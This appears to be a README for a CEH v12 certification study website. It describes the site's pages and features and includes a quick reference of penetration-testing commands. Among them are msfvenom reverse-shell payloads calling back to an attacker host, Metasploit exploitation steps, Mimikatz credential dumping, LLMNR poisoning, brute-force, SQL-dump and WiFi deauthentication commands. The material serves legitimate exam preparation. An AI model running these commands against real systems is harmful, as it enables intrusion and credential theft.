# CEH v12 Technical Study Portal

A high-performance, responsive study website for CEH v12 (Certified Ethical Hacker) certification, built directly from technical lab notes.

## Features

- **Dark/Light Themes:** Toggle between a clean light theme and a slate dark theme with a blue accent.
- **Deep Content:** Comprehensive coverage of every lab task, tool, and command found in the course modules.
- **Responsive Navigation:** Sidebar-driven multi-page architecture.
- **Code Ready:** Every command is wrapped in easy-to-copy code blocks with copy buttons.
- **Technical Specs:** Accurate OS fingerprinting tables, TTL signatures, and evasion techniques.
- **Progress Tracking:** Checkboxes on practice tasks and exam checklist persist in browser localStorage.
- **Print-Friendly:** `@media print` CSS for offline study.
- **203 Step-by-Step Guides:** Detailed procedural steps for 203 command blocks in the cheat sheet.

## Content

The portal is organized around the CEH Practical exam blueprint:

- **Domain Guide:** 9 exam domains ranked by weight, with scenario, exact steps, tools, and what to look for.
- **Cheat Sheet:** Consolidated command reference across all topics with step-by-step explanations.
- **Practice Lab:** 45 hands-on challenges (20 tutor patterns + 24 exam-style) with search and progress tracking.
- **Exam Checklist:** 12-point pre-exam verification with progress tracking.

Topics covered: Footprinting/Recon, Scanning, Enumeration, Vulnerability Analysis, System Hacking, Malware, Sniffing, Social Engineering, DoS, Session Hijacking, Evasion, Web Servers, Web Apps, SQLi, Wireless, Mobile, IoT/OT, Cloud, Cryptography.

## Setup

Simply clone the repository and open `index.html` in any modern web browser.

```bash
git clone <your-repo-url>
cd study_portal
# Open index.html in your browser
```

## Structure

- `index.html`: Roadmap and progress dashboard.
- `domain_guide.html`: Domain-based study guide (9 exam domains).
- `cheat_sheet.html`: Consolidated command reference with step-by-step explanations.
- `practice.html`: 45 hands-on practice challenges with search, progress tracking, difficulty badges.
- `exam_checklist.html`: 12-point pre-exam verification checklist.
- `style.css`: Shared CSS design system with variable-based theming.
- `app.js`: Shared JavaScript (theme toggle, sidebar, copy buttons, back-to-top, search, reading time).

---

## Quick Command Reference

### Reconnaissance
```bash
# Google dorking
intitle:login site:target.com
filetype:pdf site:target.com
inurl:admin site:target.com

# theHarvester
theHarvester -d target.com -l 500 -b google,bing,linkedin

# Nmap host discovery
nmap -sn -PR 10.10.1.0/24          # ARP ping (local)
nmap -sn -PS22,80,443 10.10.1.0/24 # TCP SYN ping
nmap -sn -PE 10.10.1.0/24          # ICMP echo ping
```

### Scanning
```bash
# Nmap port scan
nmap -sT -v TARGET                  # TCP connect (full open)
nmap -sS -v TARGET                  # SYN stealth (half-open)
nmap -sU -v TARGET                  # UDP scan
nmap -sV TARGET                     # Service/version detection
nmap -A TARGET                      # Aggressive (OS+version+scripts+traceroute)
nmap -O TARGET                      # OS detection
nmap -f TARGET                      # Fragment packets (evasion)
nmap -g 80 TARGET                   # Source port manipulation
```

### Enumeration
```bash
# SMB/NetBIOS
enum4linux -a TARGET                # Full enumeration
enum4linux -u user -p pass -U TARGET # Users
smbclient -L //TARGET               # List shares
smbmap -H TARGET                    # Share permissions

# SNMP
nmap -sU -p 161 TARGET              # Check SNMP port
snmpwalk -v1 -c public TARGET       # SNMP walk
snmp-check TARGET                   # SNMP enumeration

# DNS
dig ns target.com                   # Name servers
dig @ns1.target.com target.com axfr # Zone transfer
nslookup -type=mx target.com        # MX records

# LDAP
nmap -p 389 --script ldap-brute TARGET
```

### System Hacking
```bash
# Responder (LLMNR poisoning)
sudo responder -I eth0              # Start listening
# On Windows: \\CEH-Tools (triggers broadcast)
john hash.txt                       # Crack captured hash

# Metasploit
msfconsole                          # Launch
search exploit_name                 # Search exploits
use exploit/path/to/exploit         # Select exploit
set RHOSTS TARGET_IP                # Set target
set LHOST ATTACKER_IP               # Set listener
set payload windows/meterpreter/reverse_tcp
exploit                             # Run

# msfvenom payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > payload.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php
```

### Web Application
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt

# Web scanning
nikto -h http://target.com
whatweb http://target.com
wpscan --url http://target.com --enumerate u

# SQL injection
sqlmap -u 'http://target.com/page?id=1' --dbs
sqlmap -u 'http://target.com/page?id=1' -D dbname --tables
sqlmap -u 'http://target.com/page?id=1' -D dbname -T table --dump

# Brute force web login
hydra -l admin -P rockyou.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Password Cracking
```bash
# John the Ripper
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --show hash.txt
john --format=nt hash.txt           # NTLM hashes

# Hashcat
hashcat -m 0 -a 0 hash.txt rockyou.txt    # MD5
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt # NTLM
hashcat -m 0 hash.txt --show
```

### WiFi
```bash
# Monitor mode
airmon-ng start wlan0
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon
aireplay-ng -0 5 -a BSSID wlan0mon  # Deauth

# Crack
aircrack-ng -w rockyou.txt capture*.cap
```

### Steganography
```bash
steghide info image.jpg              # Check for hidden data
steghide extract -sf image.jpg -p password
stegseek image.jpg rockyou.txt       # Brute force
strings image.jpg | grep -i flag     # Simple extraction
```

### PCAP Analysis
```bash
# Tshark
tshark -r file.pcap -q -z io,phs    # Protocol hierarchy
tshark -r file.pcap -Y 'http.request' -T fields -e ip.src -e http.host
tshark -r file.pcap -Y 'dns' -T fields -e ip.src -e dns.qry.name
tshark -r file.pcap | wc -l         # Packet count
```

### Privilege Escalation (Linux)
```bash
sudo -l                             # Check sudo permissions
find / -perm -4000 2>/dev/null      # SUID binaries
cat /etc/crontab                    # Cron jobs
linpeas.sh                          # Automated enumeration
```

### Mimikatz (Windows)
```bash
# In meterpreter
load kiwi
lsa_dump_sam                        # Dump SAM
lsa_dump_secrets                    # Dump secrets
creds_all                           # All credentials
```

---

## Pages

| Page | Description |
|------|-------------|
| `index.html` | Roadmap and progress dashboard |
| `domain_guide.html` | Domain-based study guide (9 exam domains) |
| `cheat_sheet.html` | Consolidated command reference with step-by-step explanations |
| `practice.html` | 45 hands-on practice challenges |
| `exam_checklist.html` | 12-point pre-exam verification checklist |

## AI Usage

This portal was built with the assistance of an AI coding agent (Hermes Agent). AI was used to generate module content from raw lab notes, assemble HTML pages, write CSS/JS, and iterate on design. All commands and techniques were reviewed for accuracy; verify against official CEH materials before relying on them in a real exam or engagement.

## License

Educational use only. Commands and techniques are for authorized penetration testing and exam preparation.
